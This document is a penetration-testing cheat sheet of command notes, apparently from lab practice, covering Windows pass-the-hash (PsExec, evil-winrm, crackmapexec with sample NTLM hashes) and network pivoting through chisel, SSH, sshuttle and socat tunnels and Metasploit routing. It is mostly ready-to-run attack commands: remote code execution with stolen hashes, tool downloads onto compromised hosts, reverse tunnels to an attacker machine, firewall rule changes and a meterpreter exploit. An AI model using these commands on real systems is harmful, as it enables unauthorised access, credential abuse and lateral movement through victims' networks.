
### [WINDOWS ALTERNATE AUTHENTICATION (NTLM and Kerberos)](#)
By alternate authentication material, we refer to any piece of data that can be used to access a Windows account without actually knowing a user's password itself. This is possible because of how some authentication protocols used by Windows networks work.
alternatives available for NTLM and Kerberos auth are as follows.

#### Pass The Hash 
- NOTE - Pass the hash can only be done for NTLM hash, its not possible for NTLMv2 or Net-NTLM
###### PsExec

- Pass The Hash Attack using `PsExec` module of metasploit
    - Get the hash (both NTLM and LM hash required)
        - `hasdump` / `kiwi`/ Mimikatz executable
    - Use module
        - `use exploit/windows/smb/psexec ` > `set LPORT 1234` > `set RHOSTS 10.5.20.134` > `set SMBuser Administrator` > `set SMBPASS aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d` > `exploit`
    - Using python version of PsExec
        - `psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP`

###### RDP

- Get NTLM hash and use it to rdp
    - `xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH`

###### WinRM
- Syntex
    - `evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH`
- example 
    - `evil-winrm -u Administrator -H '37db630168e5f82aafa8461e05c6bbd1' -i 10.200.141.150`

###### crackmapexec
- Pass The Hash using `crackmapexec`
    - Get the hash (only NTLM hash is required)
        - `hasdump` / `kiwi`/ Mimikatz executable
    - Use tool
        - `crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d`
        - Remote code execution using crackmapexec
            - `crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d -x "ipconfig"`

#### Pass The Ticket



### [PIVOTING](#)

#### Hosts Discovery

1. ARP cache
    - `arp -a`

2. Hosts file
    - `/etc/hosts`
    - `C:\Windows\System32\drivers\etc\hosts`

3. Ping Sweep

    - Linux
        - `for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done`
    - Windows
        - `for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up`

4. Using Static Binary

    - Static Nmap binary
        - https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
    - Transfer file to compromised machine
        - ``python -m http.server 80``> ``curl -O http://10.50.138.14/nmap`
    - provide the execute permission and run
        - `chmod +x nmap` > `./nmap 10.200.141.0/24 -sn`


#### Port Scanning

1. Bash onliner
    - `for i in {1..15000}; do (echo > /dev/tcp/10.200.141.200/$i) >/dev/null 2>&1 && echo $i is open; done`

2. Using Static Binary
    - `./nmap 10.200.141.100 10.200.141.150`

3. Using script from `PowerSploit` called `Portscan.ps1`
    - below is example of script uploaded using winrm
        - `evil-winrm -u Administrator -H '37db630168e5f82aafa8461e05c6bbd1' -i 10.200.141.150 -s /usr/share/windows-resources/powersploit/Recon/`
        - *Evil-WinRM* PS C:\Users\Administrator\Documents> `Invoke-Portscan.ps1` 
        - *Evil-WinRM* PS C:\Users\Administrator\Documents> `Invoke-Portscan -Hosts 10.200.141.100 -TopPorts 50 -T 4 -oA PersonalPC`
    
#### Proxying and Port Forwarding

###### SSH Tunnel (SOCKS Proxy and Port Forwarding)

- Requirements
    - For Local Port Forwarding
        - Can be done from our attacking box when we have SSH access to the target, then you can connecy to SSH server of compromised machine from SSH client of your attacking machine.
    - For Remote Port Forward
        - Preferable if you have a shell on the compromised server, but not the SSH access, then you can use SSH client and connect to SSH server of your attacking machine
        
- Local SSH Tunnel Port Forwarding / Foward Port Forwarding
    - From Attacker Machine (ssh client) to Comproised machine (ssh server) for target machine
        - `ssh -i ssh_key root@10.200.141.200 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -L 9999:10.200.141.150:80 -fN`
        
        - `ssh nadine@10.10.10.184 -L 4444:127.0.0.1:8443 `

- Remote SSH Tunnel Port Forwarding / Reverse Port Forwarding
    - From Compromised machine (ssh client) to attacker machine (ssh server) for target machine
        - `ssh kali@172.16.0.20 -i KEYFILE -R 8000:172.16.0.10:80 -fN`

- SOCKS proxy 
    - From Attacker machine to Compromised Machine for target machine
        - `ssh -i ssh_key root@10.200.141.200 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -D 1337 -C -N `

        - Example use
            - `curl --socks5 localhost:1337 http://10.200.141.150`
        
        - Use with Proxychains
            - `nano /etc/proxychains.conf` > `socks4  127.0.0.1 1337`
            - `proxychains curl http://10.200.141.150`


###### Chisel (SOCKS Proxy and Port Forwarding)

- Requirements
    - Chilsel Windows / Linux binary 
        - https://github.com/jpillora/chisel/releases

- Local Port Forwarding / Forward Port Forwarding
    - From Attacker Machine (chisel client) to Comproised machine (chisel server) for target machine
        - On the compromised target
            - If its windows machine we first need to open a port using `netsh` so that firewall dosen't block our connection
                - - `netsh advfirewall firewall add rule name="chisel-sam" dir=in action=allow protocol=tcp localport=8000`
                
                - Now start a chisel server in this port

            - `./chisel server -p LISTEN_PORT`
        - from our attacking machine
            - `./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT`
        - For Example
            - For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use:
            - `./chisel server -p 8000`
            - `./chisel client 172.16.0.5:8000 2222:172.16.0.10:22`

- Reverse Port Forwarding / Remote Port Forwarding
    - From Compromised machine (Chisel client) to attacker machine (chisel server) for target machine
        - On the atracker machine
            - ``./chisel server -p LISTEN_PORT --reverse &``
        - On the compromised target
            - `./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &`
        - For Example
            - let's assume that our own IP is 172.16.0.20, the compromised server's IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. The syntax for forwarding 172.16.0.10:22 back to port 2222 on our attacking machine would be as follows:
                - `./chisel server -p 1337 --reverse &`
                - `./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &`

- SOCKS Proxy

    - Reverse SOCKS proxy
        - from a compromised machine (client) attacking machine (server)
        - On our own attacking machine
            - `./chisel server -p LISTEN_PORT --reverse &`
        - On the compromised host
            - `./chisel client ATTACKING_IP:LISTEN_PORT R:socks &`
        - For Example
            - `./chisel server -p 1337 --reverse &`
            - `./chisel client 10.50.73.2:1337 R:socks &`

    - Forward SOCKS proxy
        - from attacker machine to compromised machine
        - on the compromised host
            - `./chisel server -p LISTEN_PORT --socks5`
        - On our own attacking machine
            - `./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks`
        - For example, `./chisel client 172.16.0.10:8080 1337:socks` would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine

    - NOTE - Just like SOCKS proxy with SSH Tunnel in chisel also you will have to use word `socks4` or `socks5` for every proxy command, similar to SSH Tunnel we can use `proxychains` or `foxyproxy` here as well



###### SHuttle (proxy)

- Requirements
    - needs Access to the compromised server via `SSH`
    - `Python` also needs to be installed on the server
    - sshuttle only works on Linux targets.

- From Attacker machine to Compromised Machine for target machine
- Syntex
    - `sshuttle -r username@address subnet`
    - `sshuttle -r username@address -N`
    - - `sshuttle -r user@address SUBNET --ssh-cmd "ssh -i KEYFILE" -x compromisedMachineIP`

- Example use
    - `sshuttle -r root@10.200.141.200 10.200.141.0/24 --ssh-cmd "ssh -i ssh_key" -x 10.200.141.200`

###### SOCAT (Port Forwarding)

- Requirements
    - socat binary
        - https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
        - https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download

- By opening a port on compromised server
    - On compromised server
        - `./socat tcp-l:9090,fork,reuseaddr tcp:10.200.141.150:80 &`
    - From Attacker machine
        - `curl http://10.200.141.200:9090`

- without opening any port on Compromised server
    - On Attacker machine
        - `socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &`
    - On Compromised machine
        - `./socat tcp:10.50.130.14:8001 tcp:10.200.141.150:80,fork &`
    - From Attacker machine
        - `curl http://127.0.0.1:8000`



### Pivoting using metasploit

- Identify the Network interfaces
    - `ipconfig`
- Add route to your current subnet to access other network available
    - `run autoroute -s 10.5.26.0/20`
        - With this we actually addedd route to our msfconsole, now we can access any device from this msfconsole
    - we can also list routes
        - `run autoroute -p`
            - Addiing route wont allow you to execute anythin other than metasloit modules,  so its not like we can do nmap scan on victim 2 just by adding route, but instead we can user modules like portscan etc
- Port scanning on other network IP within same subnet (we already have IP in this case)
    - `search portscan` > `use auxiliary/scanner/portscan/tcp` > `set RHOSTS 10.5.31.52` > `set PORTS 1-100` > `exploit`
        - We observe that we have port 80 open on victim 2, but we still cant access it directly (not by any way)
    - To perform a Nmap scan we will need to Forward port 80 on victim 2 to a port on our local host which is the kali linux instance.
- Port Forwarding
    - `portfwd add -l 1234 -p 80 -r 10.5.31.52`
        - Now we can do nmap scan by specifying port 1234 and kali linux ip/localhost which will eventually do nmap scan for port 80 of victim 2 machine
- Scanning port 80 on victim2 by using port 1234 on our kali
    - `db_nmap -p 1234 -sS -sV localhost`
- Further we can exploit if service running is vulnerable
    - `use windows/http/badblue_passthru` > `set payload windows/meterpreter/bind_tcp` > `set payload windows/meterpreter/bind_tcp` > `set payload windows/meterpreter/bind_tcp` > `set LPORT 4433` > `exploit`

